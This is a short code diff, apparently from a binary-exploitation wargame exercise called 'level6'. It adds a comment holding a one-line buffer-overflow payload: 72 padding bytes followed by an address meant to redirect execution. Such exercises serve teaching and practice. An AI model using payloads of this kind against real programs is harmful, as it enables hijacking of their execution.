@@ -12,6 +12,7 @@ void m(void)
     puts("Nope");
 }
 
+// ./level6 "$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')"
 int main(int argc, char **argv)
 {
     char    *buf;
